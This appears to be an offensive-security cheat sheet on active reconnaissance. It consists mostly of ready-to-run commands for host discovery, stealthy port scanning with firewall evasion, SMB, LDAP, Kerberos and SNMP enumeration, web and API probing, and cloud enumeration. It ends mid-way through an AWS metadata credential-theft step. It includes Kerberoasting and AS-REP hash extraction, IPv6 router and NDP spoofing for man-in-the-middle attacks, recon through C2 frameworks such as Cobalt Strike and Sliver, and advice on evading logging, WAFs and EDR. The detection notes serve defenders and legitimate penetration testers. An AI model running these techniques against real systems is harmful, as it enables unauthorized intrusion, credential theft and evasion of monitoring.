# Active Reconnaissance — NoVanity Cheat Sheets

> **☕ Found this useful?** Support the project:
> **[Buy Me a Coffee](https://www.buymeacoffee.com/NoVanity)** ·
> **ETH:** `0x3844c08bb832b086d00dbbfec128cb31bdcca838`


---

## 0 — ACTIVE RECON METHODOLOGY

```
SYSTEMATIC WORKFLOW:

PHASE 1: EXTERNAL SURFACE MAPPING (from internet, pre-engagement position)
├── Subdomain enumeration (DNS brute, cert transparency, web crawl)
├── Port scanning (external-facing hosts — careful, slow, distributed)
├── Service fingerprinting (version detection on discovered ports)
├── Web application discovery (directories, technologies, APIs)
├── Cloud asset enumeration (S3, Azure Blob, GCS, public snapshots)
├── TLS/certificate analysis (SANs reveal internal names, infrastructure)
├── IPv6 surface discovery (dual-stack hosts, tunnel endpoints)          
└── TLS fingerprint management (match browser JA3/JA4 signatures)       

PHASE 2: VULNERABILITY IDENTIFICATION (prioritized scanning)
├── Nuclei / Nmap NSE against discovered services
├── Default credentials on exposed management interfaces
├── Known CVE matching against identified versions
├── Web application vulnerability scanning (authenticated if creds obtained)
├── Cloud misconfiguration checks
└── ICS/OT protocol identification on non-standard ports              

PHASE 3: INTERNAL NETWORK MAPPING (post-initial-access)
├── Host discovery (ARP, ping sweep, DNS, SMB, Responder passive)
├── IPv6 link-local enumeration (ff02::1 multicast, NDP)              
├── Full port scan of discovered hosts
├── AD enumeration (BloodHound CE, LDAP, Kerberos, SMB)
├── AD CS enumeration (Certipy — ESC1-ESC16)                          
├── Service enumeration (SMB shares, MSSQL, NFS, SNMP)
├── Identify high-value targets (DCs, CAs, file servers, jump hosts)
├── AD trust enumeration (forest trusts, SID history, PAM trusts)           v3
├── Backup infrastructure discovery (Veeam, Commvault, Veritas)             v3
├── Identity provider enumeration (ADFS, Okta, Entra ID federation)         v3
├── Virtualization infrastructure (vCenter, ESXi, Hyper-V)                  v3
├── Network device access (routing tables, ACLs, VLAN maps)                 v3
├── OT/ICS network boundary identification                            
├── Deception detection (honeypots, canary tokens, decoy accounts)     
└── EDR/AV identification and evasion posture assessment               

OPSEC PRIORITY ORDER (quietest → noisiest):
  1. DNS queries via DoH/DoT (encrypted, blends with HTTPS traffic)
  2. DNS queries via standard resolvers (blends with normal traffic)
  3. HTTPS connections to web services (normal browser behavior)
  4. Single-port checks on specific hosts (minimal footprint)
  5. Targeted Nmap -sS with low rate (few packets per host)
  6. Service version detection -sV (multiple probes per port)
  7. Full port scan -p- (65535 ports × N hosts = very noisy)
  8. Nuclei / vulnerability scanning (hundreds of requests per host)
  9. Nmap scripting engine -sC (active probes, can trigger alerts)
  10. Masscan / fast scanning (extremely noisy, easily detected)
  11. Nessus / OpenVAS (thousands of checks, very loud)

CRITICAL OPSEC CONSIDERATIONS:
  - Manage TLS fingerprints: every tool has a unique JA3/JA4 signature
  - Infrastructure rotation: <72 hours per engagement IP
  - Behavioral matching: operate during target's business hours/timezone
  - EDR awareness: know what endpoint protection exists before running commands
  - Deception awareness: assume honeypots/canary tokens are deployed
  - IPv6 blind spots: most monitoring is IPv4-focused — leverage this
```

---

## 1 — HOST DISCOVERY

```bash
# ═══════════════════════════════════════════════════════════
# EXTERNAL HOST DISCOVERY (from internet)
# ═══════════════════════════════════════════════════════════
# Prefer passive sources first (Shodan, Censys — see Passive Recon sheet)
# Active DNS brute force:
dnsx -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -silent -o dns_hosts.txt
# Resolve discovered subdomains:
cat subdomains.txt | dnsx -a -resp -silent | tee resolved.txt
# Reverse DNS on IP ranges:
nmap -sL 203.0.113.0/24 | grep "report for" | awk '{print $5, $6}'
#
# DETECTION: High volume DNS queries from single source
# OPSEC: Use public DNS resolvers (8.8.8.8, 1.1.1.1), distribute queries across resolvers
#   ENHANCED: Use DNS over HTTPS to avoid DNS monitoring entirely:
#   curl -s "https://dns.google/resolve?name=sub.target.com&type=A" | jq '.Answer[].data'
#   curl -s "https://cloudflare-dns.com/dns-query?name=sub.target.com&type=A" -H "accept: application/dns-json" | jq '.Answer[].data'

# ═══════════════════════════════════════════════════════════
# INTERNAL HOST DISCOVERY (post-access, inside network)
# ═══════════════════════════════════════════════════════════
# ARP scan (local subnet — fastest, most reliable, Layer 2 only):
nmap -sn -PR 10.0.0.0/24                     # ARP ping only
sudo netdiscover -r 10.0.0.0/24              # Active ARP scan
sudo netdiscover -p                           # Passive ARP (listen only — no packets transmitted)
arp-scan -l                                   # Scan local subnet
#
# ICMP + TCP ping sweep:
nmap -sn 10.0.0.0/24                         # ICMP echo + TCP 80,443 + ARP
nmap -sn -PS22,80,135,443,445 10.0.0.0/24    # TCP SYN ping on common ports
nmap -sn -PA80,443 10.0.0.0/24               # TCP ACK ping (bypasses stateless firewalls)
nmap -sn -PU53,161 10.0.0.0/24               # UDP ping (DNS, SNMP)
fping -a -g 10.0.0.0/24 2>/dev/null          # Fast ICMP sweep
#
# Skip host discovery (when ICMP is blocked):
nmap -Pn -sS -p 22,80,135,443,445 10.0.0.0/24
#
# Passive internal discovery (zero transmitted packets):
sudo responder -I eth0 -A                     # Analyze mode — captures LLMNR/NBT-NS/mDNS broadcasts
# Reveals: live hosts, hostnames, domain names, services, without sending any probes
#
# DNS-based internal discovery:
# Query internal DNS for common names:
for name in dc01 dc02 exchange mail sql file print web app dev; do
  nslookup $name.target.local 2>/dev/null | grep "Address:" | tail -1
done
#
# ═══════════════════════════════════════════════════════════
# IPv6 HOST DISCOVERY (often overlooked — critical blind spot)          
# ═══════════════════════════════════════════════════════════
# Every modern OS has IPv6 link-local addresses even if "not configured"
# Multicast ping to all-nodes group (reaches every IPv6 host on segment):
ping6 -c 2 ff02::1%eth0                      # All-nodes multicast
ping6 -c 2 ff02::2%eth0                      # All-routers multicast
# Nmap IPv6 multicast discovery:
nmap -6 -sn --script=targets-ipv6-multicast-echo ff02::1%eth0
nmap -6 -sn --script=targets-ipv6-multicast-slaac fe80::/10%eth0
# Low-address scanning (most orgs use sequential ::1 to ::ffff):
nmap -6 -sn 2001:db8:1::1-ffff               # ~65K addresses, feasible
# THC-IPv6 toolkit:
alive6 eth0                                   # Discover IPv6 hosts on local segment
detect-new-ip6 eth0                           # Passive — monitor for new IPv6 hosts
fake_router6 eth0                             # Rogue RA injection (MITM, forces IPv6 traffic)
parasite6 eth0                                # NDP spoofing (IPv6 equivalent of ARP spoofing)
# IPv6 tunnel detection:
# 6to4: prefix 2002::/16 (contains embedded IPv4 address)
# Teredo: UDP port 3544
# ISATAP: nslookup isatap.target.local
#
# DETECTION: IPv6 multicast pings appear normal. RA injection may trigger RA Guard if deployed.
# OPSEC: Most enterprise monitoring is IPv4-only. IPv6 lateral movement avoids most logging.
#   Use link-local addresses (fe80::) for lateral movement — never routes, never logged externally.
#   CVE-2024-38063 demonstrated Windows RCE via IPv6 packets — attack surface exists even when "disabled"

# ═══════════════════════════════════════════════════════════
# NMAP LIST SCAN (DNS resolution only — zero packets to targets)
# ═══════════════════════════════════════════════════════════
nmap -sL 10.0.0.0/24                         # Resolves hostnames via DNS only
# Useful for: mapping IP ranges to hostnames without touching targets

# ═══════════════════════════════════════════════════════════
# DNS CACHE SNOOPING (reveals what the org accesses)          
# ═══════════════════════════════════════════════════════════
# Non-recursive query reveals cached domains (what users visit):
dig +norecurse @<target-dns> www.crowdstrike.com    # Check if they use CrowdStrike
dig +norecurse @<target-dns> update.microsoft.com   # Check patch activity
dig +norecurse @<target-dns> vpn.target.com         # Check VPN usage
# Nmap automated cache snooping:
nmap --script dns-cache-snoop.nse --script-args 'dns-cache-snoop.domains={crowdstrike.com,sentinelone.net,carbonblack.io,okta.com,duo.com}' -p 53 <DNS_SERVER>
# Timed mode (for servers blocking non-recursive queries):
nmap --script dns-cache-snoop.nse --script-args 'dns-cache-snoop.mode=timed' -p 53 <DNS_SERVER>
#
# INTELLIGENCE VALUE: Reveals security vendors, SaaS platforms, VPN in use, business relationships
# OPSEC: Single UDP packet per check — very low noise
```

---

## 2 — PORT SCANNING

```bash
# ═══════════════════════════════════════════════════════════
# NMAP — STANDARD SCANS
# ═══════════════════════════════════════════════════════════
# Quick scan (top 1000 TCP ports):
nmap -sS -T4 <target> -oA quick_scan
# Full TCP (all 65535 ports):
nmap -sS -p- -T4 <target> -oA full_tcp
# Full TCP + version + safe scripts:
nmap -sS -sV -sC -p- -T4 <target> -oA full_scan
# UDP (slow but critical — many services only on UDP):
nmap -sU --top-ports 50 <target> -oA udp_top50
nmap -sU -p 53,67,69,88,123,161,162,500,514,1900,5353 <target>
# Combined TCP + UDP:
nmap -sS -sU -p T:1-65535,U:53,67,69,88,123,161,500,514,1900 <target>
#
# DETECTION: SYN scan (-sS) generates fewer application-level logs than connect scan (-sT)
#   ⚠️ MYTH CHECK: Calling SYN scan "stealth" is a 1990s relic. Nmap's own documentation warns:
#   "don't count on a default SYN scan slipping undetected through sensitive networks."
#   SYN never completes the handshake — no application-level log entry generated
#   Connect (-sT) causes "connection received, no data" errors in service logs
#   NOTE: Modern IDS/IPS detects BOTH scan types — "quieter" applies to app-level logs only
#   The only truly stealthy port scan is idle/zombie (-sI) — zero packets from your IP
#   Full port scan generates 65535 SYN packets per host — very detectable
#   IDS/IPS signature: "port scan detected" on most commercial products
# OPSEC: Use -T2 or lower, scan in small batches, spread across time
#   NOTE: "Slow scanning avoids detection" is also increasingly unreliable —
#   behavioral analytics (UEBA) baseline normal traffic and flag ANY deviation,
#   even one probe per minute to an unusual port. Effective only against immature SOCs.

# ═══════════════════════════════════════════════════════════
# SCAN SPEED & STEALTH TUNING
# ═══════════════════════════════════════════════════════════
# MAXIMUM STEALTH (external engagement, avoid detection):
nmap -sS -T1 --max-rate 10 --scan-delay 5s --randomize-hosts -p 22,80,443,8443 <targets>
# BALANCED (internal, moderate detection risk):
nmap -sS -T3 --min-rate 500 --max-retries 2 <target>
# MAXIMUM SPEED (internal, detection not a concern):
nmap -sS -T5 --min-rate 10000 -p- <target>
# Or use RustScan for initial port discovery → Nmap for service detection:
rustscan -a <target> --ulimit 5000 -- -sV -sC
# Or Masscan for ultra-fast discovery:
masscan 10.0.0.0/16 -p 1-65535 --rate 10000 -oG masscan_results.gnmap
# NOTE: Masscan accepts -p 0-65535 but port 0 is reserved; -p 1-65535 is standard practice

# ═══════════════════════════════════════════════════════════
# FIREWALL EVASION TECHNIQUES
# ═══════════════════════════════════════════════════════════
nmap -f <target>                              # Fragment packets (8-byte fragments)
#   ⚠️ MYTH CHECK: Fragmentation rarely bypasses modern IDS/IPS — they perform full fragment
#   reassembly before inspection. Fragmented traffic is itself anomalous and may trigger alerts.
#   May still work against severely underfunded legacy deployments only.
nmap -D RND:10 <target>                       # Decoy scan (10 random source IPs)
nmap --source-port 53 <target>                # Spoof source port (DNS — often allowed)
nmap --source-port 88 <target>                # Spoof source port (Kerberos)
nmap --data-length 50 <target>                # Append random data to probe packets
nmap -sS --scan-delay 5s <target>             # Slow scan to evade rate-based detection
nmap --spoof-mac 0 <target>                   # Random MAC address (Layer 2 only)
nmap -sI zombie_host <target>                 # Idle/zombie scan (no packets from your IP)
nmap --badsum <target>                        # Detect firewall/IPS (drops bad checksums)
#   NOTE: --badsum works because normal stacks drop bad checksums; any response = intermediary device
#   CAVEAT: Many modern firewalls now verify checksums; kernel/NIC may also silently correct before TX
#
# ── CORRECTED DECOY SCAN NOTES (v2) ──────────────────────
# Decoys (-D) work with: all raw-packet scans (SYN, UDP, FIN, NULL, Xmas, ACK, Window,
#   Maimon), host discovery, and OS detection (-O)
# Decoys do NOT work with: version detection (-sV), or connect scan (-sT)
# NOTE: The standalone -sR (RPC scan) was merged into -sV in March 2011.
#   Any reference to "RPC scan" as a separate scan type is outdated — it's now part of -sV.
# The original v1 claim that decoys work with connect scans was INCORRECT
#
# ── IDLE SCAN NOTES ──────────────────────────────────────
# -sI requires a zombie host with globally-assigned INCREMENTAL IP ID sequences
# Good zombies: printers, cheap routers, older Windows boxes (increment by 256, not 1)
# Find zombies: nmap --script ipidseq <candidate> (look for "Incremental" result)
# Bad zombies: any host with randomized or per-destination-host IP IDs (most modern OS)

# ═══════════════════════════════════════════════════════════
# OUTPUT & PARSING
# ═══════════════════════════════════════════════════════════
nmap -oA scan_results <target>                # All formats (.nmap, .xml, .gnmap)
# Parse grepable output:
grep "open" scan.gnmap | awk '{print $2}'                    # IPs with any open port
grep "445/open" scan.gnmap | awk '{print $2}'                # IPs with SMB
grep "/open/" scan.gnmap | sed 's/.*Ports: //' | tr ',' '\n' # Extract all open ports
# Convert Nmap XML to HTML report:
xsltproc scan.xml -o report.html
```

---

## 3 — SERVICE & APPLICATION ENUMERATION

```bash
# ═══════════════════════════════════════════════════════════
# SERVICE VERSION DETECTION
# ═══════════════════════════════════════════════════════════
nmap -sV -sC -p <ports> <target>
# ── CORRECTED: Version intensity default is 7, NOT 5 (v2) ──
# Version intensity (0=light/fast, 9=thorough/slow):
nmap -sV --version-intensity 7 <target>       # Default (CORRECTED from v1 which said 5)
nmap -sV --version-intensity 2 <target>       # --version-light alias (fast, fewer probes)
nmap -sV --version-intensity 9 <target>       # --version-all alias (maximum, noisy but accurate)
# OPSEC NOTE: Default intensity 7 sends MORE probes than operators often assume.
#   For stealth, use --version-intensity 2-4 to reduce probe count significantly.
#   Intensity 7 sends probes with rarity values ≤7 (most probes). Only intensity 8-9 adds more.

# ═══════════════════════════════════════════════════════════
# SMB (139/445) — Critical for AD environments
# ═══════════════════════════════════════════════════════════
nmap --script=smb-enum-shares,smb-enum-users,smb-os-discovery,smb-vuln* -p 445 <target>
enum4linux-ng -A <target>                     # All enumeration (modern replacement)
nxc smb <target> --shares -u '' -p ''         # Null session share enum
nxc smb <target> --shares -u 'guest' -p ''    # Guest session
nxc smb <target> --users -u '' -p ''          # User enumeration
smbclient -L //<target>/ -N                   # List shares (null session)
smbmap -H <target> -u '' -p ''                # Map share permissions
# SMB signing check (for NTLM relay viability):
nxc smb 10.0.0.0/24 --gen-relay-list relay_targets.txt
#
# DETECTION: SMB enumeration generates Event ID 4624 (type 3), 5140, 5145
#   4624 Type 3 = Network logon (fires on successful SMB authentication)
#   5140 = Network share object accessed (fires once per session per share)
#   5145 = Detailed share access check (fires per-file/folder — very granular if enabled)
# OPSEC: Null session enumeration is common and generally low-risk
#   ENHANCED: Watch for honeypot shares with enticing names (see Section 12)

# ═══════════════════════════════════════════════════════════
# LDAP (389/636) — AD Domain Enumeration
# ═══════════════════════════════════════════════════════════
# Unauthenticated enumeration:
ldapsearch -x -H ldap://<target> -b "" -s base namingContexts
ldapsearch -x -H ldap://<target> -b "" -s base defaultNamingContext
# With credentials (much more data):
ldapsearch -x -H ldap://<target> -D "user@target.local" -w 'password' -b "DC=target,DC=local" "(objectClass=user)" sAMAccountName
# AD enumeration via nxc:
nxc ldap <DC> -u user -p pass --users
nxc ldap <DC> -u user -p pass --groups
nxc ldap <DC> -u user -p pass --trusted-for-delegation
nxc ldap <DC> -u user -p pass --password-not-required
nxc ldap <DC> -u user -p pass --admin-count
# BloodHound CE collection (updated for Community Edition):
# bloodhound-python -c All -d target.local -u user -p pass -dc DC01.target.local
# NOTE: BloodHound CE (SpecterOps rewrite) now supports ADCS attack paths (ESC1-ESC14+)
#
# AD Certificate Services enumeration (critical attack surface):                
# Certipy (covers ESC1-ESC16 including ESC15/CVE-2024-49019/EKUwu):
# certipy find -u user@target.local -p pass -dc-ip <DC_IP> -vulnerable
# certipy find -u user@target.local -p pass -dc-ip <DC_IP> -text -output certipy_results
# Outputs BloodHound CE-compatible JSON for attack path visualization
#
# Authentication coercion discovery (for relay attacks):                        
# Coercer — triggers/coerces Windows servers to authenticate to attacker machine:
# coercer scan -t <target> -u user -p pass -d target.local
# NOTE: Coercer COERCES authentication — the relay is the actual attack.
#   Microsoft does not consider coerced authentication a vulnerability — only relaying is.
# Pairs with Certipy relay for AD CS ESC8 (NTLM relay to HTTP enrollment endpoints)
# IMPORTANT: Exchange 2019 CU14+ enables Extended Protection by default; Windows Server 2025
#   removes NTLMv1 entirely. NTLM relay attacks are being hardened — test viability first.
#
# DETECTION: LDAP queries logged if auditing enabled, mass object enumeration
#   Microsoft Defender for Identity detects SAMR-based enumeration specifically
# OPSEC: LDAP enumeration is normal AD behavior — moderate risk
#   ENHANCED: Avoid querying all sensitive groups rapidly — generates correlated incidents in MDI

# ═══════════════════════════════════════════════════════════
# KERBEROS (88) — User Enumeration Without Credentials
# ═══════════════════════════════════════════════════════════
# Enumerate valid usernames via Kerberos (no auth required):
kerbrute userenum -d target.local --dc <DC_IP> users.txt
# Kerberos pre-auth check (identify AS-REP roastable accounts):
nxc ldap <DC> -u user -p pass --asreproast asrep_hashes.txt
# Kerberoastable accounts:
nxc ldap <DC> -u user -p pass --kerberoasting kerb_hashes.txt
#
# DETECTION: Event ID 4768 (TGT requested — generated ONLY on domain controllers)
#   Event ID 4771 (Kerberos pre-auth failed — failure-only event, DC-only)
#   Mass 4771 events from single source = user enumeration detected
# OPSEC: Kerbrute generates failed pre-auth events — use cautiously
#   ENHANCED: Kerbrute at >5 attempts/second triggers most SIEM correlation rules

# ═══════════════════════════════════════════════════════════
# DNS (53) — Zone Transfers & Enumeration
# ═══════════════════════════════════════════════════════════
dig axfr target.com @<DNS_SERVER>             # Zone transfer (if allowed)
dnsrecon -d target.com -t axfr                # Automated zone transfer
dnsrecon -d target.com -t std                 # Standard DNS enumeration
dnsrecon -d target.com -t brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
fierce --domain target.com --dns-servers <DNS> # DNS enumeration + zone walking
#
# DNSSEC zone walking (enumerate all records if DNSSEC with NSEC):
ldns-walk target.com                          # Walk NSEC records
dnsrecon -d target.com -z                     # DNSSEC zone walk via dnsrecon
nmap --script dns-nsec-enum --script-args dns-nsec-enum.domains=target.com -p 53 <DNS>
# NSEC3 cracking: ~90% of DNSSEC TLDs use NSEC3 (hashed), but offline dictionary attacks
#   can reverse common names. Tools: nsec3map, nsec3walker
# OPSEC: NSEC walking generates minimal traffic — very low noise
#
# DNS over HTTPS for covert resolution (bypasses all DNS monitoring):           
curl -s "https://dns.google/resolve?name=target.com&type=ANY" | jq '.'
curl -s "https://cloudflare-dns.com/dns-query?name=target.com&type=A" -H "accept: application/dns-json"
# Passive DNS pivoting (zero queries to target infrastructure):                 
# SecurityTrails API: given IP → all domains ever resolved to it (and vice versa)
# Microsoft Defender Threat Intelligence (formerly PassiveTotal): bidirectional DNS pivoting
# CIRCL passive DNS: free academic/research access
# Intelligence value: reveals shared infrastructure, campaign history, shadow IT
#
# Internal DNS enumeration (post-access):
# Reverse lookup entire subnet:
dnsrecon -r 10.0.0.0/24 -n <DC_IP>
# Or Nmap:
nmap -sL 10.0.0.0/24 --dns-servers <DC_IP>

# ═══════════════════════════════════════════════════════════
# SNMP (161/162 UDP) — Network Device Enumeration
# ═══════════════════════════════════════════════════════════
# Community string brute force:
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <target>
# Walk MIB with known community:
snmpwalk -v2c -c public <target>                               # Full MIB walk
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.1.1.0            # System description (sysDescr, RFC 3418)
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.25.4.2.1.2       # Running processes (hrSWRunName, RFC 2790)
snmpwalk -v2c -c public <target> 1.3.6.1.4.1.77.1.2.25        # Windows user accounts (svUserTable, LAN Manager MIB - enterprise 77)
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.25.6.3.1.2       # Installed software (hrSWInstalledName, RFC 2790)
# ── CORRECTED TCP OID note (v2) ──
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.6.13.1.3         # TCP connection local ports (tcpConnLocalPort)
# NOTE: This OID returns ALL TCP connection states (established, time-wait, etc.), NOT just listening ports.
#   Filter by tcpConnState (.1.3.6.1.2.1.6.13.1.1) = 2 (listen) for only listeners.
#   ALSO: tcpConnTable (OID .6.13) is DEPRECATED per RFC 4022. Modern replacement:
#   1.3.6.1.2.1.6.19 (tcpConnectionTable) — supports both IPv4 and IPv6
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.6.19             # Modern TCP connections (IPv4+IPv6)
# Nmap SNMP scripts:
nmap -sU --script=snmp-info,snmp-brute,snmp-interfaces,snmp-processes -p 161 <target>

# ═══════════════════════════════════════════════════════════
# OTHER CRITICAL SERVICES
# ═══════════════════════════════════════════════════════════
# SSH (22):
ssh-audit <target>                            # Detailed SSH audit (algos, CVEs)
nmap --script=ssh2-enum-algos,ssh-hostkey,ssh-auth-methods -p 22 <target>
# FTP (21):
nmap --script=ftp-anon,ftp-bounce,ftp-vuln* -p 21 <target>
ftp <target>                                  # Try anonymous (user: anonymous, pass: blank)
# SMTP (25/465/587):
nmap --script=smtp-commands,smtp-enum-users -p 25,465,587 <target>
smtp-user-enum -M VRFY -U users.txt -t <target>
smtp-user-enum -M RCPT -U users.txt -t <target>
# NFS (2049):
showmount -e <target>                         # List NFS exports
nmap --script=nfs-ls,nfs-showmount -p 2049 <target>
# MSSQL (1433):
nxc mssql <target> -u sa -p passwords.txt
nmap --script=ms-sql-info,ms-sql-ntlm-info -p 1433 <target>
# RDP (3389):
nmap --script=rdp-enum-encryption,rdp-ntlm-info -p 3389 <target>
# WinRM (5985/5986):
nxc winrm <target> -u admin -p password
# MySQL (3306) / PostgreSQL (5432):
nmap --script=mysql-info,mysql-enum -p 3306 <target>
nmap --script=postgresql-brute -p 5432 <target>
# Redis (6379):
nmap --script=redis-info -p 6379 <target>
redis-cli -h <target> PING                   # Test unauthenticated access
# Docker API (2375/2376):
curl http://<target>:2375/version             # Unauthenticated Docker API
# Kubernetes API (6443/10250):
curl -sk https://<target>:6443/api            # K8s API server (expect 401/403 unless misconfigured)
curl -sk https://<target>:10250/pods          # Kubelet endpoint
# ── CORRECTED Kubernetes notes (v2) ──
# Clusters deployed via kubeadm/KubeletConfiguration (v1beta1, since K8s 1.10) default
#   authentication.anonymous.enabled=false. HOWEVER, the raw kubelet CLI flag
#   --anonymous-auth still defaults to TRUE, and --authorization-mode defaults to AlwaysAllow.
# Manually deployed clusters or those using raw flags may have anonymous kubelet access.
# A 200 response = misconfiguration OR raw-flag deployment = immediate foothold opportunity

# ═══════════════════════════════════════════════════════════
# INTERNAL RECON THROUGH EXISTING C2 (T1046 + T1018)
# ═══════════════════════════════════════════════════════════
# Run scans FROM the compromised host via C2 — zero new outbound connections,
# all traffic originates from a legitimate internal host.
#
# Cobalt Strike:
# portscan 10.0.0.0/24 1-1024,3389,5985 arp
# net view — list network neighborhood
# net domain_controllers — find DCs
# Sliver (Bishop Fox — mTLS, WireGuard, HTTP(S), DNS C2 channels):                ← EXPANDED
# scan tcp 10.0.0.0/24 -p 22,80,135,443,445,3389,5985
# Havoc C2 (Demon agent with BOF support):                                        
# Built-in network enumeration modules, Microsoft Graph API C2 channel
# Mythic / Meterpreter: use built-in portscan / network-enum modules
#
# BOF (Beacon Object Files) for stealth recon:                                     
# Execute entirely in-memory within existing process — no child process, no disk artifacts
# ~3KB footprint. Available for Cobalt Strike and Sliver via community repositories.
# Examples: bof-net-enum, InlineWhispers (syscall BOFs), nanodump (LSASS), SA-BOF
#
# PowerShell living-off-the-land (no tool upload needed):
1..254 | % { Test-NetConnection -ComputerName 10.0.0.$_ -Port 445 -WarningAction SilentlyContinue | ? {$_.TcpTestSucceeded} | select ComputerName,RemotePort }
# cmd.exe (no PowerShell):
for /L %i in (1,1,254) do @ping -n 1 -w 100 10.0.0.%i | find "Reply" && echo 10.0.0.%i is alive
#
# OPSEC: All traffic appears to come from compromised host — highest stealth for internal recon
# DETECTION: EDR on compromised host may detect scan-like network behavior
```

---

## 4 — WEB APPLICATION RECONNAISSANCE

```bash
# ═══════════════════════════════════════════════════════════
# SUBDOMAIN ENUMERATION (Active methods)
# ═══════════════════════════════════════════════════════════
# DNS brute force:
dnsx -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -silent
gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 50
# Combine with passive sources (subfinder, amass) for comprehensive list:
subfinder -d target.com -silent | dnsx -a -resp -silent | tee all_subdomains.txt
# VHost enumeration (discover virtual hosts on same IP):
gobuster vhost -u http://<IP> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
# Or ffuf:
ffuf -u http://<IP> -H "Host: FUZZ.target.com" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <default_size>
#
# Certificate Transparency log mining (passive but relevant here):               
# crt.sh reveals internal hostnames, staging environments, dev servers:
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq '.[].name_value' | sort -u
# Combined with passive DNS = comprehensive subdomain discovery without touching target
#
# DETECTION: High volume DNS queries, DNS brute force patterns
# OPSEC: Distribute queries across multiple resolvers, use slow rate

# ═══════════════════════════════════════════════════════════
# TECHNOLOGY FINGERPRINTING
# ═══════════════════════════════════════════════════════════
whatweb https://target.com                    # Technology detection (CMS, server, frameworks)
# httpx (probe multiple URLs, extract tech, status, title):
cat subdomains.txt | httpx -silent -title -status-code -tech-detect -content-length
# Wappalyzer (browser extension or CLI): identifies tech stack
# Nmap HTTP scripts:
nmap --script=http-title,http-headers,http-server-header,http-methods -p 80,443 <target>
# Check response headers manually:
curl -sI https://target.com | grep -i "server\|x-powered-by\|x-aspnet\|set-cookie"
#
# OPSEC: Single HTTPS request per check — very low noise
#   ENHANCED: Ensure your curl/httpx TLS fingerprint matches a real browser (see Section 11)

# ═══════════════════════════════════════════════════════════
# DIRECTORY & FILE BRUTE FORCE
# ═══════════════════════════════════════════════════════════
# Feroxbuster (Rust — fast, recursive, smart):
feroxbuster -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50 -x php,asp,aspx,jsp,html,js,json
# Gobuster:
gobuster dir -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,aspx,jsp
# ffuf (fast, flexible):
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302,403 -t 50
# Dirsearch:
dirsearch -u https://target.com -e php,asp,aspx,jsp -t 50
#
# Common interesting paths:
# /robots.txt, /sitemap.xml, /.git/, /.env, /backup/, /admin/, /api/,
# /swagger/, /graphql, /debug/, /test/, /wp-admin/, /wp-config.php.bak,
# /server-status, /server-info, /.well-known/
#
# DETECTION: High volume HTTP requests, 404 spikes in access logs, WAF alerts
# OPSEC: Throttle with -t (threads) and --delay, use common User-Agent header
#   WAF evasion: rotate User-Agent, add jitter, use -H "X-Forwarded-For: <random>"
#   CRITICAL: Set JA3/JA4-matching TLS fingerprint (see Section 11)

# ═══════════════════════════════════════════════════════════
# API ENUMERATION
# ═══════════════════════════════════════════════════════════
# Discover API endpoints:
ffuf -u https://target.com/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,301,401,403
# Swagger/OpenAPI spec (if exposed):
curl -s https://target.com/swagger.json
curl -s https://target.com/openapi.json
curl -s https://target.com/v2/api-docs
curl -s https://target.com/api-docs
# GraphQL introspection (if enabled):
curl -s -X POST https://target.com/graphql -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name}}}}"}'
# REST API method testing:
for method in GET POST PUT DELETE PATCH OPTIONS; do
  echo -n "$method: "; curl -s -o /dev/null -w "%{http_code}" -X $method https://target.com/api/endpoint
  echo ""
done
#
# DETECTION: API enumeration in access logs, introspection queries
# OPSEC: API probing looks like legitimate development activity — moderate risk

# ═══════════════════════════════════════════════════════════
# TLS / CERTIFICATE ANALYSIS
# ═══════════════════════════════════════════════════════════
# Extract certificate details (reveals hostnames, internal names, org info):
echo | openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -noout -text | grep -E "Subject:|DNS:|Issuer:"
# Extract all SANs (Subject Alternative Names):
echo | openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -noout -ext subjectAltName
# SSLScan:
sslscan target.com                           # Cipher suites, protocols, cert details
# testssl.sh (comprehensive TLS audit):
testssl.sh target.com
# Nmap SSL scripts:
nmap --script=ssl-enum-ciphers,ssl-cert -p 443 <target>
#
# SANs often reveal: internal hostnames, dev/staging environments, wildcard scope
# OPSEC: Single TLS handshake — extremely low noise
```

---

## 5 — CLOUD ASSET ENUMERATION

```bash
# ═══════════════════════════════════════════════════════════
# AWS ENUMERATION
# ═══════════════════════════════════════════════════════════
# S3 bucket discovery:
# Check common naming patterns: target-backup, target-dev, target-logs, target-data
aws s3 ls s3://target-bucket --no-sign-request 2>/dev/null && echo "PUBLIC"
# Brute force bucket names:
# Use cloud_enum, S3Scanner, or custom wordlist
# Cloud_enum (multi-cloud):
cloud_enum -k target -k target.com
# Check for public EBS snapshots owned by target (search by description/name):
# NOTE: --owner-ids self returns YOUR snapshots. For public snapshots, use
# --restorable-by-user-ids all to find snapshots shared publicly:
aws ec2 describe-snapshots --restorable-by-user-ids all \
  --filters "Name=description,Values=*target*" --region us-east-1 --query 'Snapshots[*].[SnapshotId,Description,VolumeSize]'
# Or search by known target AWS account ID:
aws ec2 describe-snapshots --owner-ids <TARGET_ACCT_ID> --region us-east-1
#
# AWS IMDS exploitation (if you have SSRF or code execution on EC2):             
# IMDSv1 (no token required — Datadog 2025 found ~50% of instances still allow this):
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
# IMDSv2 (requires token):
TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
